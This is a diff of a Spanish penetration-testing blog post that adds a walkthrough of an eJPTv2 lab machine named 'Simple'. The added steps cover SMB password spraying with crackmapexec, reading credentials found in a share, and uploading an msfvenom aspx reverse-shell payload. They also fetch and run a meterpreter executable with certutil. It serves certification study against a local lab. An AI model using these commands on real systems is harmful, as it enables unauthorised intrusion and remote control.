@@ -30,16 +30,16 @@
 <meta property="og:locale" content="es_ES">
 <meta property="og:image" content="https://sergiky.github.io/images/sergiky.webp">
 <meta property="article:published_time" content="2025-03-24T23:00:00.000Z">
-<meta property="article:modified_time" content="2025-04-03T10:49:57.716Z">
+<meta property="article:modified_time" content="2025-04-07T13:11:46.215Z">
 <meta property="article:author" content="Sergio Guijarro">
 <meta property="article:tag" content="ctf">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="windows">
+<meta property="article:tag" content="eJPT">
 <meta property="article:tag" content="vulnhub">
 <meta property="article:tag" content="linux">
-<meta property="article:tag" content="windows">
 <meta property="article:tag" content="pivoting">
 <meta property="article:tag" content="movimiento-lateral">
-<meta property="article:tag" content="eJPT">
-<meta property="article:tag" content="easy">
 <meta property="article:tag" content="id-rsa-cracking">
 <meta property="article:tag" content="path-hijacking">
 <meta property="article:tag" content="smb">
@@ -307,7 +307,7 @@
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">49</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">46</div>
         <div class="label text-third-text-color text-sm">Etiquetas</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
@@ -368,8 +368,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-04-03 12:49:57</span>
-            <span class="mobile">2025-04-03 12:49:57</span>
+            <span class="desktop">2025-04-07 15:11:46</span>
+            <span class="mobile">2025-04-07 15:11:46</span>
             <span class="hover-info">Actualizado</span>
         </span>
     
@@ -411,6 +411,18 @@
                     </li>
                 
                     <li>
+                        | <a href="/tags/easy/">easy</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/windows/">windows</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/eJPT/">eJPT</a>&nbsp;
+                    </li>
+                
+                    <li>
                         | <a href="/tags/vulnhub/">vulnhub</a>&nbsp;
                     </li>
                 
@@ -419,23 +431,11 @@
                     </li>
                 
                     <li>
-                        | <a href="/tags/windows/">windows</a>&nbsp;
-                    </li>
-                
-                    <li>
                         | <a href="/tags/pivoting/">pivoting</a>&nbsp;
                     </li>
                 
                     <li>
                         | <a href="/tags/movimiento-lateral/">movimiento-lateral</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/eJPT/">eJPT</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/easy/">easy</a>&nbsp;
                     </li>
                 
                     <li>
@@ -1351,6 +1351,198 @@
                      data-src="/2025/03/25/lab-ejptv2-xerosec/exploiting_failed_2009-3103_metasploit_experience.png"
                       alt="Explotación fallida del cve 2009-3103."
                 ><figcaption>Explotación fallida del cve 2009-3103.</figcaption></figure></p>
+<h1 id="🎯-Simple"><a href="#🎯-Simple" class="headerlink" title="🎯 Simple"></a>🎯 Simple</h1><h2 id="Enumeracion-3"><a href="#Enumeracion-3" class="headerlink" title="Enumeración"></a>Enumeración</h2><p>Vamos a inspeccionar el archivo con los servicios y las versiones de los puertos y vemos que la máquina 10.0.2.5 es nuestra máquina Simple y tiene abiertos los puertos: 80,135,139,445,5985,47001,49664,49665…</p>
+<p>Recordar que podéis ver las tecnologías con whatweb:</p>
+<h3 id="Web-2"><a href="#Web-2" class="headerlink" title="Web"></a>Web</h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/whatweb_simple.png"
+                      alt="Resultado de whatweb."
+                ><figcaption>Resultado de whatweb.</figcaption></figure></p>
+<p>Ya nos chiva por detrás que esta corriendo un Microsoft-IIS, vamos a inspeccionar la página web:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/first_view_browser_simple.png"
+                      alt="Primer vistazo de la página."
+                ><figcaption>Primer vistazo de la página.</figcaption></figure></p>
+<p>Bueno, a parte de ver una falta ortográfica en “comming” también podemos ver los agradecimientos a diferentes usuarios, estos los podemos guardar en formato lista por si hicieran falta más adelante.</p>
+<p>Podemos buscar en el código fuente, la consola, la herramienta de red… Pero no vamos a encontrar nada.</p>
+<p>Así que directamente vamos a realizar fuzzing con dirbuster(ya que dir funciona de aquella manera), le añadimos <strong>200 hilos</strong> al escaneo como siempre para que vaya más rápido. Después de unos cuantos intentos de fuzzing vemos que no nos reporta nada excepto el index.html, images&#x2F;, fonts&#x2F; con código de estado 403.</p>
+<p>Así que sin encontrar nada aquí, vamos a inspecionar el servicio SMB</p>
+<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>Lo primero es comprobar si podemos utilizar una null session o el usuario guest para listar archivos.</p>
+<p>Podemos probar con smbclient, smbmap, crackmapexec.</p>
+<p>Con smbclient y smbmap no me reportaba nada, con crackmapexec me reporta lo siguiente:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --shares</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/crackmapexec_null_session_simple.png"
+                      alt="Resultado de intento de null sessio con crackmapexec."
+                ><figcaption>Resultado de intento de null sessio con crackmapexec.</figcaption></figure></p>
+<p>Pero recordar que tenemos una lista de potenciales usuarios, así que podemos probar con la contraseña en blanco a ver si vemos algo nuevo.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u users.txt -p <span class="string">&#x27;&#x27;</span> --shares</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/crackmapexec_list_users_without_password_simple.png"
+                      alt="Probando con la lista de usuarios."
+                ><figcaption>Probando con la lista de usuarios.</figcaption></figure></p>
+<p>Claro, una vez aquí pensamos y porque no hacemos fuerza bruta con algún diccionario común como rockyou o algunos de Seclist, pero más sencillo que eso y un detalle <strong>MUY IMPORTANTE</strong>. Es utilizar la lista de usuarios como contraseñas al igual que utilizar las contraseñas como lista de usuario. Esto aplica tanto en el ejptv2 como en el OSCP.</p>
+<p>Estás “tonterías” pueden ser muy importante y que nos saltemos algo muy valioso:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u users.txt -p users.txt --shares</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/crackmapexec_list_users_with_user_password_simple.png"
+                      alt="Probando con los usuarios como contraseña."
+                ><figcaption>Probando con los usuarios como contraseña.</figcaption></figure></p>
+<p>En este caso vemos que <strong>bogo:bogo</strong> funciona y se detiene ahí, si no queremos que se detenga cuando encuentra algo tenemos que añadir el switch <strong>–continue-on-success</strong>.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/crackmapexec_list_users_with_user_password_contiune_on_success_simple.png"
+                      alt="Con el parámetro --continue-on-success."
+                ><figcaption>Con el parámetro --continue-on-success.</figcaption></figure></p>
+<p>Como hemos visto anteriormente tenemos permisos de lectura para el recurso compartido $IPC y LOGS. Así que con smbclient vamos a conectarnos al recurso LOGS haber que encontramos.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.0.2.5/LOGS -U <span class="string">&#x27;bogo&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/smbclient_log_file_simple.png"
+                      alt="Archivo log en el usuario bogo."
+                ><figcaption>Archivo log en el usuario bogo.</figcaption></figure></p>
+<p>Pues nos descargamos el archivo y le echamos un vistazo para comprobar que contiene.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/marcos_credentials_smb_simple.png"
+                      alt="Credenciales de marcos de SMB."
+                ><figcaption>Credenciales de marcos de SMB.</figcaption></figure></p>
+<p>En este archivo encontramos que existe un recurso interno llamado WEB al que es accesible con el usuario marcos y la contraseña SuperPassword, así que vamos a intentar listar los recursos compartidos con crackmapexec:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u <span class="string">&#x27;marcos&#x27;</span> -p <span class="string">&#x27;SuperPassword&#x27;</span> --shares</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/crackmapexec_marcos_credentials_shares_smb_simple.png"
+                      alt="Recursos compartidos disponibles para el usuario Marcos."
+                ><figcaption>Recursos compartidos disponibles para el usuario Marcos.</figcaption></figure></p>
+<p>Podemos ver que podemos acceder al recurso LOGS igual que con el usuario bogo, pero también tenemos accedo al recurso WEB con permisos de lectura y escritura.</p>
+<p>Si accedemos al recurso con smbclient:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.0.2.5/WEB -U <span class="string">&#x27;marcos&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img src="/2025/03/25/lab-ejptv2-xerosec/marcos_smbclient_shared_files_simple.png" alt="Recursos compartidos en /WEB."><figcaption>Recursos compartidos en /WEB.</figcaption></figure></p>
+<p>Estos archivos nos van sonando… Si, hemos encontrado algunos al realizar fuzzing con dirbuster.</p>
+<p>Nosotros como el usuario marcos tenemos permisos de escritura sobre dicho directorio, ¿si subimos un archivo podremos acceder desde la web?</p>
+<p>Vamos crear un archivo .html chapusa y probamos a subirlo al directorio compartido, en mi caso lo he llamado sergiky.html y de contenido solo tiene la cadena “pwn3d”.</p>
+<p>Una vez creado entramos al recurso y lo subimos con la orden <code>put</code>, este utiliza la ruta del sistema desde la consola donde iniciaste el smbclient, en mi caso tengo el archivo en el mismo directorio:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put sergiky.html</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/upload_test_file_marco_smb_simple.png"
+                      alt="Archivo sergiky.html subido."
+                ><figcaption>Archivo sergiky.html subido.</figcaption></figure></p>
+<p>Si checkeamos si el archivo se ha subido desde el navegador:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/upload_test_file_marco_smb_in_browser_simple.png"
+                      alt="Comprobamos desde el navegador si podemos visualizar el archivo."
+                ><figcaption>Comprobamos desde el navegador si podemos visualizar el archivo.</figcaption></figure></p>
+<p>Genial! Vemos que podemos subir archivos.</p>
+<h2 id="Explotacion-3"><a href="#Explotacion-3" class="headerlink" title="Explotación"></a>Explotación</h2><p>La idea ahora es subir un archivo .php para poder obtener una shell en el equipo, el problema que esto es un sistema linux y nosotros estamos en un servidor IIS en Windows como vimos anteriormente. En los servidores IIS de Windows, lo equivalente a los archivos .php son los archivos <strong>.asp</strong> y <strong>.aspx</strong>. Estos están <strong>configurados por defecto</strong>.</p>
+<p>Así que con msfvenom nos vamos a crear un archivo .aspx y de ser interpretado por el servidor nos va a dar una reverse shell.</p>
+<p>Para crear el binario nos podemos dirigir a la página <a class="link"   target="_blank" rel="noopener" href="https://www.revshells.com/" >revshells<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> que también nos da todos los parámetros de msfvenom para crear los archivos correspondientes.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/revshells_cmd_msfvenom_simple.png"
+                      alt="Parámetros para crear una reverse shell en Windows."
+                ><figcaption>Parámetros para crear una reverse shell en Windows.</figcaption></figure></p>
+<p>Como veis no esta del todo correcto, nos crea un ejecutable .exe y no queremos eso, así que vamos a copiarlo y modificarlo en la consola. Tenemos que cambiar el formato(-f) y el nombre del archivo de salida.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.5 LPORT=443 -f aspx -o reverse.aspx</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/msfvenom_cmd_payload_created_simple.png"
+                      alt="Payload de msfvenom."
+                ><figcaption>Payload de msfvenom.</figcaption></figure></p>
+<p>En caso de que la máquina <strong>no fuera de 64 bits</strong>(por ejemplo no funciona al darnos la shell) podemos prescindir del &#x2F;x64&#x2F; aunque no hará falta realizar esto.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.5 LPORT=443 -f aspx -o reverse.aspx</span><br></pre></td></tr></table></figure></div>
+
+<p>Lo subimos al servidor con <code>put</code> y comprobamos que existe en el navegador.</p>
+<p>Si nos ponemos en escucha con netcat y recargamos la página donde esta reverse shell:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 443</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/gain_access_defaultapppol_simple.png"
+                      alt="Ganando acceso como defaultapppool."
+                ><figcaption>Ganando acceso como defaultapppool.</figcaption></figure></p>
+<p>Vale y si ahora nosotros queremos obtener una sesión meterpreter. Una de las formas es subir un archivo que nos de una sesión meterpreter directamente y capturarlo con &#x2F;multi&#x2F;handler en metasploit.</p>
+<p>En esta máquina, si intentas subir un archivo .aspx <strong>y que te de una meterpreter directamente no funciona</strong>. Así que vamos a probar dos formas diferentes, vamos a probar a upgradear la sesión desde metasploit para que la cmd se convierta en meterpreter y la otra forma es crear un archivo binario .exe que ejecutado por un usuario nos de una sesión meterpreter y v.</p>
+<h3 id="Upgradear-a-meterpreter"><a href="#Upgradear-a-meterpreter" class="headerlink" title="Upgradear a meterpreter"></a>Upgradear a meterpreter</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use /exploit/multi/handler</span><br><span class="line">set payload windows/x64/shell_reverse_tcp</span><br><span class="line">set LHOST 10.0.2.7</span><br><span class="line">set LPORT 443</span><br></pre></td></tr></table></figure></div>
+<p>Recargamos la página con la reverse shell y y una vez obtenida la sesión la llevamos a segundo plano con el comando <code>background</code> o ctrl+z y con el siguiente comando:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -u 1</span><br></pre></td></tr></table></figure></div>
+<p>Intentamos upgradear la sesión 1 a una sesión meterpreter.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/upgrading_session_metasploit_simple.png"
+                      alt="Upgradeamos la sesión de metasploit."
+                ><figcaption>Upgradeamos la sesión de metasploit.</figcaption></figure></p>
+<p>Si ahora hacemos <code>sessions -l</code> vemos que tenemos otra sesión de tipo meterpreter.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/upgrading_session_metasploit_show_sessions_simple.png"
+                      alt="Sesiones disponibles."
+                ><figcaption>Sesiones disponibles.</figcaption></figure></p>
+<p>Para acceder a una sesión utilizamos <code>sessions -i 2</code>.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/using_upgrading_session_metasploit_simple.png"
+                      alt="Dentro de la sesión meterpreter."
+                ><figcaption>Dentro de la sesión meterpreter.</figcaption></figure></p>
+<h3 id="Creando-ejecutable-para-crear-sesion-meterpreter"><a href="#Creando-ejecutable-para-crear-sesion-meterpreter" class="headerlink" title="Creando ejecutable para crear sesión meterpreter"></a>Creando ejecutable para crear sesión meterpreter</h3><p>Desde otra consola dejando la cmd víctima abierta creamos un ejecutable:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.2.7 LPORT=443 -f exe -o meterpreter.exe</span><br></pre></td></tr></table></figure></div>
+
+<p>Una vez creado no vamos a realizar el mismo proceso de subirlo a través de smb…</p>
+<p>Vamos a levantar un servidor http en python:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure></div>
+
+<p>Si lo abrimos desde el navegador podemos ver los archivos que nos ofrece:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/view_python_server_simple.png"
+                      alt="Servidor web en python."
+                ><figcaption>Servidor web en python.</figcaption></figure></p>
+<p>Pues la idea ahora es utilizar alguna utilidad que tengamos disponible para descarganos el archivo, en este caso podemos utilizar <strong>certutil.exe</strong> ya que es una cmd y no una powershell.</p>
+<p>Nos podemos dirigir a la carpeta Public donde tendremos permisos para escribir o nos podemos dirigir a la carpeta C:\Windows\Temp</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Windows\Temp</span><br><span class="line">certutil.exe -f -urlcache http://<span class="number">10</span>.<span class="number">0</span>.<span class="number">2</span>.<span class="number">7</span>/meterpreter.exe meterpreter.exe</span><br></pre></td></tr></table></figure></div>
+
+<p>Por X razón al hacer <code>dir</code> no vemos el archivo y parece que no se ha subido, pero en realidad si se ha subido.</p>
+<p>Nos levantamos el &#x2F;multi&#x2F;handler de metasploit y configuramos las características:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line">set LHOST 10.0.2.7</span><br><span class="line">set LPORT 443</span><br></pre></td></tr></table></figure></div>
+
+<p>Y ejecutamos el binario:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\meterpreter.exe</span><br></pre></td></tr></table></figure></div>
+
+<p>Y nos llegará la sesión correspondiente.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/get_meterpreter_session_upload_extra_binary_simple.png"
+                      alt="Obteniendo la sesión con meterpreter."
+                ><figcaption>Obteniendo la sesión con meterpreter.</figcaption></figure></p>
 <h1 id="Enlaces-de-interes"><a href="#Enlaces-de-interes" class="headerlink" title="Enlaces de interés"></a>Enlaces de interés</h1><ul>
 <li>Laboratorio de xerosec: <a class="link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=v20IsEd5nUU" >https://www.youtube.com/watch?v=v20IsEd5nUU<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
 </ul>
@@ -1367,6 +1559,18 @@
 			</li>
 			
 			<li class="tag-item mx-0.5">
+				<a href="/tags/easy/">#easy</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/windows/">#windows</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/eJPT/">#eJPT</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
 				<a href="/tags/vulnhub/">#vulnhub</a>&nbsp;
 			</li>
 			
@@ -1375,23 +1579,11 @@
 			</li>
 			
 			<li class="tag-item mx-0.5">
-				<a href="/tags/windows/">#windows</a>&nbsp;
-			</li>
-			
-			<li class="tag-item mx-0.5">
 				<a href="/tags/pivoting/">#pivoting</a>&nbsp;
 			</li>
 			
 			<li class="tag-item mx-0.5">
 				<a href="/tags/movimiento-lateral/">#movimiento-lateral</a>&nbsp;
-			</li>
-			
-			<li class="tag-item mx-0.5">
-				<a href="/tags/eJPT/">#eJPT</a>&nbsp;
-			</li>
-			
-			<li class="tag-item mx-0.5">
-				<a href="/tags/easy/">#easy</a>&nbsp;
 			</li>
 			
 			<li class="tag-item mx-0.5">
@@ -1483,24 +1675,24 @@
     <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
      <i aria-hidden="true"></i><span>Artículos recomendados</span>
     </div>
-    <div class="recommended-article-group"><a class="recommended-article-item" href="/2024/12/04/Symfonos 1 y 2/" title="Symfonos 1 y 2 | S4vitar | Pivoting I" rel="bookmark">
-  <img src="https://sergiky.github.io/2024/12/04/Symfonos%201%20y%202/cover-image.png" alt="Symfonos 1 y 2 | S4vitar | Pivoting I" class="!max-w-none">
-  <span class="title">Symfonos 1 y 2 | S4vitar | Pivoting I</span>
-</a><a class="recommended-article-item" href="/2025/01/09/Blue/" title="Blue | WriteUp" rel="bookmark">
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/2025/01/09/Blue/" title="Blue | WriteUp" rel="bookmark">
   <img src="https://sergiky.github.io/2025/01/09/Blue/cover_image.png" alt="Blue | WriteUp" class="!max-w-none">
   <span class="title">Blue | WriteUp</span>
+</a><a class="recommended-article-item" href="/2024/12/04/Symfonos 1 y 2/" title="Symfonos 1 y 2 | S4vitar | Pivoting I" rel="bookmark">
+  <img src="https://sergiky.github.io/2024/12/04/Symfonos%201%20y%202/cover-image.png" alt="Symfonos 1 y 2 | S4vitar | Pivoting I" class="!max-w-none">
+  <span class="title">Symfonos 1 y 2 | S4vitar | Pivoting I</span>
 </a></div>
    </div>
    <div class="recommended-mobile">
    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
      <i aria-hidden="true"></i><span>Artículos recomendados</span>
    </div>
-   <div class="recommended-article-group"><a class="recommended-article-item" href="/2024/12/04/Symfonos 1 y 2/" title="Symfonos 1 y 2 | S4vitar | Pivoting I" rel="bookmark">
-  <img src="https://sergiky.github.io/2024/12/04/Symfonos%201%20y%202/cover-image.png" alt="Symfonos 1 y 2 | S4vitar | Pivoting I" class="!max-w-none">
-  <span class="title">Symfonos 1 y 2 | S4vitar | Pivoting I</span>
-</a><a class="recommended-article-item" href="/2025/01/09/Blue/" title="Blue | WriteUp" rel="bookmark">
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/2025/01/09/Blue/" title="Blue | WriteUp" rel="bookmark">
   <img src="https://sergiky.github.io/2025/01/09/Blue/cover_image.png" alt="Blue | WriteUp" class="!max-w-none">
   <span class="title">Blue | WriteUp</span>
+</a><a class="recommended-article-item" href="/2024/12/04/Symfonos 1 y 2/" title="Symfonos 1 y 2 | S4vitar | Pivoting I" rel="bookmark">
+  <img src="https://sergiky.github.io/2024/12/04/Symfonos%201%20y%202/cover-image.png" alt="Symfonos 1 y 2 | S4vitar | Pivoting I" class="!max-w-none">
+  <span class="title">Symfonos 1 y 2 | S4vitar | Pivoting I</span>
 </a></div>
    </div>
   </div>
@@ -1577,7 +1769,7 @@
 	<div class="post-toc">
 		<div class="toc-title">En esta página</div>
 		<div class="page-title">Laboratorio preparatorio ejptv2 | Xerosec</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Creacion-del-laboratorio"><span class="nav-text">Creación del laboratorio</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Recursos-necesarios"><span class="nav-text">Recursos necesarios</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Configuracion-de-los-adaptadores-de-red"><span class="nav-text">Configuración de los adaptadores de red</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Configuracion-extra-maquinas"><span class="nav-text">Configuración extra máquinas</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Maquina-Symfonos-1"><span class="nav-text">Máquina Symfonos 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Simple"><span class="nav-text">Simple</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Empezamos-el-laboratorio"><span class="nav-text">Empezamos el laboratorio</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Creacion-del-entorno-de-trabajo"><span class="nav-text">Creación del entorno de trabajo</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Descubrimiento-de-hosts"><span class="nav-text">Descubrimiento de hosts</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Escaneamos-puertos"><span class="nav-text">Escaneamos puertos</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Escaneo-de-servicios-y-sus-versiones"><span class="nav-text">Escaneo de servicios y sus versiones</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%8E%AF-Symfonos"><span class="nav-text">🎯 Symfonos</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeracion"><span class="nav-text">Enumeración</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Ssh"><span class="nav-text">Ssh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB-Samba"><span class="nav-text">SMB&#x2F;Samba</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Wordpress-en-h3l105"><span class="nav-text">Wordpress en h3l105</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Uso-de-WPScan"><span class="nav-text">Uso de WPScan</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Explotacion"><span class="nav-text">Explotación</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh2john"><span class="nav-text">ssh2john</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Escalada-de-privilegios"><span class="nav-text">Escalada de privilegios</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%8E%AF-Doc"><span class="nav-text">🎯 Doc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeracion-1"><span class="nav-text">Enumeración</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-1"><span class="nav-text">Web</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Explotacion-1"><span class="nav-text">Explotación</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLi"><span class="nav-text">SQLi</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-Upload"><span class="nav-text">File Upload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Escalada-de-privilegios-1"><span class="nav-text">Escalada de privilegios</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%8E%AF-Experience"><span class="nav-text">🎯 Experience</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeracion-2"><span class="nav-text">Enumeración</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#smb-vuln-scripts-nmap"><span class="nav-text">smb-vuln scripts nmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Explotacion-2"><span class="nav-text">Explotación</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit"><span class="nav-text">Metasploit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MS17-010-Eternal-Blue"><span 